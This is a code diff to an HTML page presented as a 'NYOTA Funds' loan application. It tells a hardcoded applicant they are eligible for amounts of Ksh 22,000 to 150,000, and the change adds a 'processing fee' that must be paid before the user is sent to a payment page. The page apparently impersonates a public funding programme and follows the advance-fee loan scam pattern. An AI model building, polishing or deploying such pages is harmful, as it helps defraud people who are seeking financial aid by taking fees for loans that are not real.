@@ -162,133 +162,87 @@ padding:12px;
 color:#666;
 font-size:11px;
 }
-</style>
-</head>
-
-<body>
-
-<div class="container">
-
-<div class="header">
-
-<h2>🇰🇪🇰🇪Congratulations 🎉</h2>
-
-<p><strong id="applicantName"></strong></p>
-
-<p>
-You're eligible for NYOTA Funds Limits.
-Kindly choose the amount you want to apply then you continue with application.
-</p>
-</div>
-
-<div class="content">
-
-<div class="section-title">Choose an Amount</div>
-
-<div class="grid">
-
-<label class="option">
-<input type="radio" name="amount" value="22000">
-<span class="amount">Ksh 22,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="30000">
-<span class="amount">Ksh 30,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="40000">
-<span class="amount">Ksh 40,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="50000">
-<span class="amount">Ksh 50,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="65000">
-<span class="amount">Ksh 65,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="75000">
-<span class="amount">Ksh 75,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="85000">
-<span class="amount">Ksh 85,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option">
-<input type="radio" name="amount" value="110000">
-<span class="amount">Ksh 110,000</span>
-<span class="checkmark"></span>
-</label>
-
-<label class="option last">
-<input type="radio" name="amount" value="150000">
-<span class="amount">Ksh 150,000</span>
-<span class="checkmark"></span>
-</label>
-
-</div>
-
-<div class="summary">
-<p><strong>Selected Amount:</strong> <span id="selected">Ksh ---</span></p>
-</div>
-
-<button id="continueBtn" type="button" disabled>Continue →</button>
-
-</div>
-
-<div class="footer">🇰🇪🇰🇪NYOTA Funds Application🇰🇪🇰🇪</div>
-
-</div>
-
-<script>
-const radios = document.querySelectorAll('input[name="amount"]');
-const selected = document.getElementById("selected");
-const button = document.getElementById("continueBtn");
-
-let chosenAmount = "";
-
-radios.forEach(radio=>{
-  radio.addEventListener("change",function(){
-
-    document.querySelectorAll(".option").forEach(card=>{
-      card.classList.remove("active");
-    });
-
-    this.closest(".option").classList.add("active");
-
-    chosenAmount = this.value;
-    selected.textContent = "Ksh " + Number(chosenAmount).toLocaleString();
-
-    localStorage.setItem("selectedAmount", chosenAmount);
-
-    button.disabled = false;
-  });
-});
-
-button.addEventListener("click",function(){
-  if(!chosenAmount){
-    alert("Please select an amount.");
-    return;
-  }
-
-  window.location.href = "payment.html";
-});
-</script>
-
-</body>
-</html>
+    </style>  </head>  <body>  <div class="container">  <div class="header">  <h2>Congratulations 🎉</h2>  <p><strong id="applicantName">Kipngetich Isaac</strong></p>  <p>  
+You're eligible for NYOTA Funds Limits.  
+Kindly choose the amount you want and pay the processing fee to continue.  
+</p>  </div>  <div class="content">  <div class="section-title">  
+Select Your NYOTA Fund Amount  
+</div>  <label class="option">  
+<input type="radio" name="amount" value="22000" data-fee="1">  
+<span>Ksh 22,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="30000" data-fee="450">  
+<span>Ksh 30,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="40000" data-fee="550">  
+<span>Ksh 40,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="50000" data-fee="650">  
+<span>Ksh 50,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="65000" data-fee="800">  
+<span>Ksh 65,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="75000" data-fee="900">  
+<span>Ksh 75,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="85000" data-fee="1000">  
+<span>Ksh 85,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="110000" data-fee="1200">  
+<span>Ksh 110,000</span>  
+</label>  <label class="option">  
+<input type="radio" name="amount" value="150000" data-fee="1500">  
+<span>Ksh 150,000</span>  
+</label>  <div class="summary">  <p><strong>Amount Selected:</strong> <span id="selected">Ksh ---</span></p>  <p><strong>Processing Fee:</strong> <span id="fee">Ksh ---</span></p>  <p style="margin-top:10px;color:#6B7280;font-size:13px;">  
+Select an amount to see the processing fee.  
+</p>  </div>  <button id="continueButton" type="button">  
+Continue →  
+</button>  </div>  <div class="footer">  
+NYOTA Funds Application  
+</div>  </div>  <script>  
+const radios=document.querySelectorAll('input[name="amount"]');  
+  
+let amount="";  
+let fee="";  
+  
+const savedName=  
+localStorage.getItem("fullName")||  
+localStorage.getItem("fullname")||  
+"Kipngetich Isaac";  
+  
+document.getElementById("applicantName").textContent=savedName;  
+  
+radios.forEach(radio=>{  
+  
+radio.addEventListener("change",function(){  
+  
+amount=this.value;  
+fee=this.dataset.fee;  
+  
+document.getElementById("selected").textContent=  
+"Ksh "+Number(amount).toLocaleString();  
+  
+document.getElementById("fee").textContent=  
+"Ksh "+Number(fee).toLocaleString();  
+  
+});  
+  
+});  
+  
+document.getElementById("continueButton").addEventListener("click",()=>{  
+  
+if(!amount){  
+alert("Please select an amount.");  
+return;  
+}  
+  
+localStorage.setItem("loanAmount",amount);  
+localStorage.setItem("requestedAmount",amount);  
+localStorage.setItem("processingFee",fee);  
+  
+window.location.href="payment.html";  
+  
+});  
+</script>  </body>  
+</html> 
